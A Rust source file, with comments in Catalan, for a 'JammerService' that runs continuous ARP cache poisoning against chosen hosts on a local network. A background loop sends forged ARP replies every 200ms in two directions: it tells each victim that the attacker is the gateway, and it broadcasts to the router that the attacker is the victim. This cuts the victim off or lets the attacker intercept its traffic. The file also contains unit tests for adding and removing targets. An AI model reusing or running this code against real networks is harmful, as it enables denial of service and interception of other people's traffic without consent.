use crate::infrastructure::network::packet_injector::PacketInjector;
use crate::infrastructure::repositories::local_intelligence;
use pnet::datalink;
use pnet::util::MacAddr;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::str::FromStr;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

#[derive(Clone)]
struct Target {
    ip: String,
    mac: String,
    gateway_ip: String,
}

pub struct JammerService {
    active_targets: Arc<Mutex<HashMap<String, Target>>>,
    running: Arc<Mutex<bool>>,
}

impl JammerService {
    pub fn new() -> Self {
        let service = Self {
            active_targets: Arc::new(Mutex::new(HashMap::new())),
            running: Arc::new(Mutex::new(true)),
        };
        service.start_attack_loop();
        service
    }

    fn start_attack_loop(&self) {
        let targets_clone = self.active_targets.clone();
        let running_clone = self.running.clone();

        thread::spawn(move || {
            loop {
                if !*running_clone.lock().unwrap() { break; }

                let has_targets = !targets_clone.lock().unwrap().is_empty();

                if !has_targets {
                    thread::sleep(Duration::from_millis(1000));
                    continue;
                }

                if let Ok(identity) = local_intelligence::get_host_identity() {
                    let interfaces = datalink::interfaces();
                    let interface = interfaces.into_iter().find(|iface| {
                         iface.ips.iter().any(|ip| ip.ip().to_string() == identity.ip)
                    });

                    if let Some(iface) = interface {
                        // Obtenim la nostra MAC
                        let my_mac = iface.mac.unwrap(); 
                        
                        let targets = targets_clone.lock().unwrap().clone();

                        // 🔥 DISPAREM RÀPID I EN DUES DIRECCIONS (Dual Poisoning)
                        for (_, target) in &targets {
                            // Convertim Strings a Tipus de Xarxa
                            let target_ip = Ipv4Addr::from_str(&target.ip).unwrap();
                            let gateway_ip = Ipv4Addr::from_str(&target.gateway_ip).unwrap();
                            
                            // Parse MAC manualment o amb helper
                            let target_mac = PacketInjector::parse_mac(&target.mac);
                            
                            // 1. ENGANYEM A LA VÍCTIMA ("Sóc el Router")
                            PacketInjector::send_fake_arp(
                                &iface, 
                                target_mac, 
                                target_ip, 
                                my_mac, 
                                gateway_ip
                            );

                            // 2. ENGANYEM AL ROUTER ("Sóc la Víctima")
                            // Com que no tenim la MAC del Router, enviem a Broadcast Ethernet
                            // però l'ARP Packet va dirigit a la IP del Router
                            let broadcast_mac = MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
                            
                            PacketInjector::send_fake_arp(
                                &iface,
                                broadcast_mac, 
                                gateway_ip,    // Target IP (Router)
                                my_mac,        // Sender MAC (Jo)
                                target_ip      // Sender IP (Víctima - Mentida!)
                            );
                        }
                    }
                }
                // ⚡ VELOCITAT D'ATAC: 200ms
                thread::sleep(Duration::from_millis(200));
            }
        });
    }
    

    pub fn start_jamming(&self, target_ip: String, target_mac: String, gateway_ip: String) {
        let mut lock = self.active_targets.lock().unwrap();
        println!("💀 [JAMMER] TARGET ACQUIRED: {} (Spoofing Gateway: {})", target_ip, gateway_ip);
        lock.insert(target_ip.clone(), Target { ip: target_ip, mac: target_mac, gateway_ip });
    }

    pub fn stop_jamming(&self, target_ip: String) {
        let mut lock = self.active_targets.lock().unwrap();
        if lock.remove(&target_ip).is_some() {
            println!("🏳️ [JAMMER] CEASE FIRE: {}", target_ip);
        }
    }
}

impl Drop for JammerService {
    fn drop(&mut self) {
        if let Ok(mut running) = self.running.lock() {
            *running = false;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn start_jamming_registers_target() {
        let service = JammerService::new();
        service.start_jamming(
            "192.168.1.20".to_string(),
            "AA:BB:CC:DD:EE:20".to_string(),
            "192.168.1.1".to_string(),
        );

        let lock = service.active_targets.lock().unwrap();
        assert_eq!(lock.len(), 1);
        assert!(lock.contains_key("192.168.1.20"));
    }

    #[test]
    fn stop_jamming_removes_target() {
        let service = JammerService::new();
        service.start_jamming(
            "192.168.1.30".to_string(),
            "AA:BB:CC:DD:EE:30".to_string(),
            "192.168.1.1".to_string(),
        );
        service.stop_jamming("192.168.1.30".to_string());

        let lock = service.active_targets.lock().unwrap();
        assert!(lock.is_empty());
    }
}
